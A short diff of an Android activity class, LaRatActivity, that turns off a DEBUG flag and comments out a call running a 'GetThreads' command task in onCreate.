@@ -14,7 +14,7 @@ import java.util.LinkedList;
 
 public class LaRatActivity extends Activity {
 
-    private boolean DEBUG = true;
+    private boolean DEBUG = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -33,9 +33,8 @@ public class LaRatActivity extends Activity {
 
             CommandContext ctx = new CommandContext(getApplicationContext(), new LinkedList<String>());
 
-            AsyncTask task = Command.getTask("GetThreads");
-
-            task.execute(ctx);
+            //AsyncTask task = Command.getTask("GetThreads");
+            //task.execute(ctx);
 
         }
 
